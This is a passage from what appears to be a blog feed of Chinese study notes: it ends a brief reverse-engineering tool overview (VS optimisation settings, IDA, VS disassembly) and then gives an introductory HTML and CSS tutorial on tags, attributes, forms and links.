问题</h4><ol><li><p>VS生成的有的代码没有</p><blockquote><p>在VS中右键项目——属性——配置属性——C/C++——优化——禁用</p><p>不禁用的话有的代码在编译时会被优化。</p></blockquote></li><li><p>窗口混乱</p><blockquote><p>View——CPU——全屏</p><p>初始打开的窗口是CPU窗口。</p></blockquote></li></ol><h3 id="3-IDA"><a href="#3-IDA" class="headerlink" title="3 IDA"></a>3 IDA</h3><blockquote><p>静态反汇编分析</p></blockquote><h3 id="4-VS调试"><a href="#4-VS调试" class="headerlink" title="4 VS调试"></a>4 VS调试</h3><blockquote><p>加断点——运行——调试——窗口——反汇编</p></blockquote><hr><h2 id="二、-磁盘扫描"><a href="#二、-磁盘扫描" class="headerlink" title="二、 磁盘扫描"></a>二、 磁盘扫描</h2><blockquote><p><a href="https://www.52pojie.cn/thread-1425151-1-1.html">要兑换码链接</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Html+CSS</title>
      <link href="/posts/9ce61be.html"/>
      <url>/posts/9ce61be.html</url>
      
        <content type="html"><![CDATA[<h1 id="Html-CSS"><a href="#Html-CSS" class="headerlink" title="Html+CSS"></a>Html+CSS</h1><blockquote><p><a href=".\cc1b9611">text::JavaScript</a> </p><p>编辑器HbuildX（ctrl + /：注释）</p></blockquote><hr><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote><p><a href="https://www.w3school.com.cn/html/html5_intro.asp">Html教程</a></p><p><a href="https://www.runoob.com/html/html5-intro.html">Html教程</a></p><p><a href="http://moretrue.site/Home/Article/article/id/26.html">教师网站</a></p></blockquote><hr><h2 id="一、基础"><a href="#一、基础" class="headerlink" title="一、基础"></a>一、基础</h2><blockquote><p><a href="https://www.php.cn/html5-tutorial-410265.html">html5新增</a></p></blockquote><h4 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1 基础知识"></a>1 基础知识</h4><ol><li><p>html 知识</p><blockquote><p>html只做格式，不做样式！</p><p>xhtml：W3C 制定的，因学习成本高，严格化很少人用。</p><p>html5：大公司联合制作，市场常用，后被 W3C 收纳。</p><p>html + xml = xhtml（html + css + js）（1.0已淘汰）</p><ol><li>strict：严格语法。</li><li>transitional：过渡型，可出错，市面上大部分标准都是这个。</li><li>frameset：框架型。</li></ol><p>浏览器模式：兼容（兼容以前的网页，慢），标准（更快）。</p><p>判断方式：头&lt;!DOCTYPE&gt;，不写默认兼容</p><p>浏览器显示不安全：使用的 http 协议而非 https 协议。（https要钱）</p></blockquote></li><li><p>XML知识</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--XML：可扩展标记语言（xml有严格语法要求，可自定义标签便于机器识别）--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;书&gt;</span><br><span class="line">    &lt;价格&gt;56&lt;/价格&gt;</span><br><span class="line">&lt;/书&gt;</span><br></pre></td></tr></table></figure></li><li><p>元素类型</p></li></ol><div class="table-container"><table><thead><tr><th>元素类型</th><th>特点</th></tr></thead><tbody><tr><td>块级元素</td><td>所占区域是整块，可设置宽高，自动换行（小间隙）</td></tr><tr><td>行内元素</td><td>所占区域按内容大小来，不可设置宽高，不自动换行</td></tr><tr><td>行内块状元素</td><td>可设置宽高，不自动换行</td></tr><tr><td>锚点</td><td>回到页面的某一处</td></tr></tbody></table></div><h4 id="2-基础语法"><a href="#2-基础语法" class="headerlink" title="2 基础语法"></a>2 基础语法</h4><ul><li><p>单标签</p><blockquote><p>html5单标签可以无 / ，xhtml必须有。</p></blockquote><ul><li>无属性 <code>&lt; 标签名/ &gt;</code></li><li>有属性 <code>&lt; 标签名 属性名=&quot;属性值&quot; [ 属性名=&quot;属性值&quot; ] / &gt;</code></li></ul></li><li><p>双标签</p><ul><li>无属性 <code>&lt; 标签名 &gt;&lt; /标签名 &gt;</code></li><li>有属性 <code>&lt; 标签名 属性名=&quot;属性值&quot; [ 属性名=&quot;属性值&quot; ] &gt;&lt; /标签名 &gt;</code></li></ul></li><li><p>整体结构</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--网页体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--头部--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--身体（浏览器可见内容）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>注意事项</p><ol><li><p>双标签必须闭合。</p></li><li><p>所有标签都是小写。</p></li><li>值必须用 “ value “，包裹。</li><li>控件错误将会被解析成文本框。（浏览器默认文本框最保险。）</li></ol></li></ul><h4 id="3-基本样式"><a href="#3-基本样式" class="headerlink" title="3 基本样式"></a>3 基本样式</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;引入的css文件的路径&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;引入的js文件的路径&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;!DOCTYPE html&gt;：声明版本html5</span></span><br><span class="line"><span class="comment">&lt;title&gt;&lt;/title&gt;：页面标题，收藏网页的默认名</span></span><br><span class="line"><span class="comment">&lt;meta&gt;：头属性设置</span></span><br><span class="line"><span class="comment">&lt;html lang=&quot;zh-CN&quot;&gt;：中文网页不要写 en，不然浏览器会提示你是否翻译网页成中文（即使写的中文）。</span></span><br><span class="line"><span class="comment">VScode中：! + Enter：快速生成html简单格式</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、标签"><a href="#二、标签" class="headerlink" title="二、标签"></a>二、标签</h2><h3 id="1-单标签"><a href="#1-单标签" class="headerlink" title="1 单标签"></a>1 单标签</h3><h4 id="1-1-水平线"><a href="#1-1-水平线" class="headerlink" title="1.1 水平线"></a>1.1 水平线</h4><p><code>&lt;hr /&gt;</code></p><blockquote><p>属性：width，size，align</p></blockquote><h4 id="1-2-换行"><a href="#1-2-换行" class="headerlink" title="1.2 换行"></a>1.2 换行</h4><p><code>&lt;br /&gt;</code></p><blockquote><p>行内元素</p></blockquote><h4 id="1-3-图片"><a href="#1-3-图片" class="headerlink" title="1.3 图片"></a>1.3 图片</h4><p><code>&lt;img /&gt;</code></p><blockquote><p>插入图片，行内元素</p><p>属性：src，title，alt，border，align，width，height（大小不建议大改，要大改直接改原图）</p></blockquote><h4 id="1-4-表单元素"><a href="#1-4-表单元素" class="headerlink" title="1.4 表单元素"></a>1.4 表单元素</h4><p><code>&lt;input /&gt;</code></p><blockquote><p>行内元素，不一定放入表单中，但提交必须放入表单中。</p><p>属性：type，value，readonly，maxlength，disabled</p><p>requried（一般不用，用 JS 实现）</p></blockquote><h3 id="2-双标签"><a href="#2-双标签" class="headerlink" title="2 双标签"></a>2 双标签</h3><h4 id="2-1-格式化标签"><a href="#2-1-格式化标签" class="headerlink" title="2.1 格式化标签"></a>2.1 格式化标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置字体相关属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：color，size，face--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--伪样式--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--与旁边区分,加粗，行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--强调，行内元素（W3C加的）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--与旁边区分,斜体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--次级强调。（W3C加的）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--下划线--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--中划线--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-普通文本"><a href="#2-2-普通文本" class="headerlink" title="2.2 普通文本"></a>2.2 普通文本</h4><h5 id="2-2-1-字体"><a href="#2-2-1-字体" class="headerlink" title="2.2.1 字体"></a>2.2.1 字体</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- n in [1,6] h1最大（会作为浏览器权重），hh6最小--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span><span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--大小依次递减。</span></span><br><span class="line"><span class="comment">不建议在网页中写多个&lt;h1&gt;标签，&lt;h1&gt;标签可以被搜索引擎获取，如果有多个可能会进入搜索引擎黑名单。（其他随意）</span></span><br><span class="line"><span class="comment">快速生成多个的写法：h$&#123; title$ &#125;*6——tab--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--abbr，标记缩写词，配合 title 使用--&gt;</span></span><br><span class="line">The<span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;World Health Organization&quot;</span>&gt;</span>WHO<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span> was founded in 1948.</span><br></pre></td></tr></table></figure><h5 id="2-2-2-段落"><a href="#2-2-2-段落" class="headerlink" title="2.2.2 段落"></a>2.2.2 段落</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--一段话，（所占区域是整块），自动换行（间隙比换行标签大）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--定义预格式化文本，保留设置时的空格和换行符，文本呈现等宽字体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-2-3-层"><a href="#2-2-3-层" class="headerlink" title="2.2.3 层"></a>2.2.3 层</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--层，块级元素（所占区域是整块，自动换行（小间隙）），用于布局--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--层，行内元素（所占区域按内容大小来，不自动换行）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-2-4-按钮"><a href="#2-2-4-按钮" class="headerlink" title="2.2.4 按钮"></a>2.2.4 按钮</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>相较表单元素可以插入内容在标签中</p><p>属性：disabled，type，value，name</p><p>tips：type默认是提交按钮</p></blockquote><h4 id="2-3-格式文本"><a href="#2-3-格式文本" class="headerlink" title="2.3 格式文本"></a>2.3 格式文本</h4><h5 id="2-3-1-列表"><a href="#2-3-1-列表" class="headerlink" title="2.3.1 列表"></a>2.3.1 列表</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：type（列表前的标识）（1.square（实心方块），2.circle（空心圆），3.disc（实心圆），4.decimal（小数）--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：type（列表前的标识）（分为1（默认），a，A，i，I）--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--自定义列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span> <span class="comment">&lt;!--标题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span> <span class="comment">&lt;!--内容--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-2-表格"><a href="#2-3-2-表格" class="headerlink" title="2.3.2 表格"></a>2.3.2 表格</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--表格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：align，border，width，height，style，colspan，rowspan--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--普通边框：style=&quot;border-collapse: collapse;&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：align，valign，bgcolor--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--表头单元格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--标准单元格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：rowspan，colspan--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-3-文本域"><a href="#2-3-3-文本域" class="headerlink" title="2.3.3 文本域"></a>2.3.3 文本域</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内元素，一块文本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：rows，cols--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-4-文本聚焦"><a href="#2-3-4-文本聚焦" class="headerlink" title="2.3.4 文本聚焦"></a>2.3.4 文本聚焦</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内元素，用于绑定多个元素。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;<span class="name">input</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：for--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-5-下拉框"><a href="#2-3-5-下拉框" class="headerlink" title="2.3.5 下拉框"></a>2.3.5 下拉框</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--下拉框，行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：name，multiple，size，disabled--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--框中元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：selected，disabled，value--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--value：提交给服务器的选项值，没有该属性则提交标签中的值--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-6-包裹框"><a href="#2-3-6-包裹框" class="headerlink" title="2.3.6 包裹框"></a>2.3.6 包裹框</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--包裹框，将内容用一个框进行包裹--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--在包裹框线处显示文字--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span><span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span>个人信息:<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">  姓名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-4-链接"><a href="#2-4-链接" class="headerlink" title="2.4 链接"></a>2.4 链接</h4><h5 id="2-4-1-超链接"><a href="#2-4-1-超链接" class="headerlink" title="2.4.1 超链接"></a>2.4.1 超链接</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置超链接，行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：href，target，name，title--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-4-2-表单"><a href="#2-4-2-表单" class="headerlink" title="2.4.2 表单"></a>2.4.2 表单</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--向服务器传输数据，块级元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：action，method，name，target--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件时设置：enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-5-HTML5"><a href="#2-5-HTML5" class="headerlink" title="2.5 HTML5"></a>2.5 HTML5</h4><h5 id="2-5-1-input"><a href="#2-5-1-input" class="headerlink" title="2.5.1 input"></a>2.5.1 input</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--type：url，email，number，range，date，search（会影响手机输入法的顶部提示）--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-5-2-内联标签"><a href="#2-5-2-内联标签" class="headerlink" title="2.5.2 内联标签"></a>2.5.2 内联标签</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--网页里套网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：src--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-5-3-格式标签"><a href="#2-5-3-格式标签" class="headerlink" title="2.5.3 格式标签"></a>2.5.3 格式标签</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--（Navigation）小型的页面内导航--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--页眉--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--页脚--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--侧边栏--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-属性"><a href="#3-属性" class="headerlink" title="3 属性"></a>3 属性</h3><h4 id="3-1-通用"><a href="#3-1-通用" class="headerlink" title="3.1 通用"></a>3.1 通用</h4><div class="table-container"><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>id</td><td>标识元素的唯一性，多用于前端判断。最好唯一，以字母、数字、下划线、中划线组成，不以数字开头</td></tr><tr><td>name</td><td>提交数据时的参数名，多用于后端判断。同一标签有同一name值为一组（例如性别设置）</td></tr><tr><td>style</td><td>设置元素的行内样式（具体的样式）</td></tr><tr><td>calss</td><td>设置元素的样式名</td></tr><tr><td>disabled</td><td>禁用</td></tr></tbody></table></div><h4 id="3-2-颜色"><a href="#3-2-颜色" class="headerlink" title="3.2 颜色"></a>3.2 颜色</h4><blockquote><p><a href="https://www.runoob.com/tags/att-td-bgcolor.html">bgcolor属性</a></p><p><a href="https://www.runoob.com/tags/att-body-text.html">text属性</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*背景*/</span></span><br><span class="line">bgcolor=&quot;value&quot;</span><br><span class="line"><span class="comment">/*文本*/</span></span><br><span class="line">text=&quot;value&quot; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* value有三种：颜色名：&quot;blue&quot;，rgb：&quot;rgb(255,0,0)&quot;，十六进制：&quot;#ff0000&quot; */</span></span><br></pre></td></tr></table></figure><h4 id="3-3-样式"><a href="#3-3-样式" class="headerlink" title="3.3 样式"></a>3.3 样式</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*宽度*/</span></span><br><span class="line"><span class="attribute">width</span>=&quot;value&quot;</span><br><span class="line"><span class="comment">/*高度*/</span></span><br><span class="line"><span class="attribute">height</span>=&quot;value&quot;</span><br><span class="line"><span class="comment">/*行长*/</span></span><br><span class="line">cols=&quot;value&quot;</span><br><span class="line"><span class="comment">/*列长*/</span></span><br><span class="line">rows=&quot;value&quot;</span><br><span class="line"><span class="comment">/*大小*/</span></span><br><span class="line">size=&quot;value&quot;</span><br><span class="line"><span class="comment">/*边框宽度*/</span></span><br><span class="line"><span class="attribute">border</span>=&quot;value&quot;</span><br><span class="line"><span class="comment">/* value：百分比(&quot;25%&quot;)，px(&quot;500px&quot;) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*上下对齐方式。value：&quot;top&quot;*/</span></span><br><span class="line">valign=&quot;value&quot;</span><br><span class="line"><span class="comment">/*左右对齐方式。value：&quot;left&quot;，&quot;right&quot;，&quot;center&quot;（默认），&quot;justify&quot;（两端对齐）*/</span></span><br><span class="line">align=&quot;value&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体样式。name：字体名字*/</span></span><br><span class="line">face=&quot;name&quot;</span><br><span class="line"><span class="comment">/*样式风格。name：格式名字*/</span></span><br><span class="line">style=&quot;name&quot;</span><br><span class="line">style=&quot;<span class="attribute">clear</span>:both;&quot;  <span class="comment">/* 清除浮动 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*鼠标悬停时文字。characters：内容*/</span></span><br><span class="line">title=&quot;characters&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*占用格子数（纵向，横向合并）。num：占用格子数*/</span></span><br><span class="line">rowspan / colspan=&quot;num&quot;</span><br></pre></td></tr></table></figure><h4 id="3-4-链接"><a href="#3-4-链接" class="headerlink" title="3.4 链接"></a>3.4 链接</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*路径。指向资源路径，可以是本地路径，可以是超链接。本地可以是：磁盘路径（写这个会从客户端的磁盘开始找），绝对路径，相对路径。*/</span></span><br><span class="line"><span class="attribute">src</span>=&quot;path&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*显示错误。characters：内容*/</span></span><br><span class="line">alt=&quot;characters&quot;</span><br></pre></td></tr></table></figure><h4 id="3-5-超链接"><a href="#3-5-超链接" class="headerlink" title="3.5 超链接"></a>3.5 超链接</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*链接*/</span></span><br><span class="line">href=&quot;url&quot;</span><br><span class="line"><span class="comment">/* href=&quot;&quot;或&quot;#&quot;时当做顶部锚点使用，&quot;#name&quot;可让该链接回到指定名字处，url 同 path。可以是邮件，如 mailto@163.com */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*打开方式*/</span></span><br><span class="line">target=&quot;value&quot;</span><br><span class="line"><span class="comment">/* value：_self：当前窗口（默认，用于顺序访问结构），_blank：新窗口（用于平行访问结构），_parent：父窗口，_top：顶级窗口 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*数据名字。name：提交数据的参数名*/</span></span><br><span class="line">name=&quot;name&quot; <span class="comment">/*或 id=&quot;name&quot;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*鼠标放置提示*/</span></span><br><span class="line">title=&quot;title&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*提交地址*/</span></span><br><span class="line">action=&quot;url&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*提交方式。value：get，post*/</span></span><br><span 